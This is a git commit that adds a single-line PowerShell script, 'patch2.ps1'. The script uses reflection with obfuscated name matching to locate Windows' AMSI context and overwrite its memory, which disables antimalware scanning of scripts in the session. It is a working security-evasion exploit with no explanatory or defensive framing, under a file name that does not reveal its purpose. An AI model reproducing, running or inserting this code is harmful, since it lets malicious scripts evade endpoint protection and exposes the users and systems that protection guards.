feb303edf7ebe402fb260f942888fdccc1df06ca
NewComrade12211 <mironovadasha1975@gmail.com>
2024-08-27 17:43:53 +0300

    Create patch2.ps1

---
+++ patch2.ps1
@@ -0,0 +1,1 @@
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
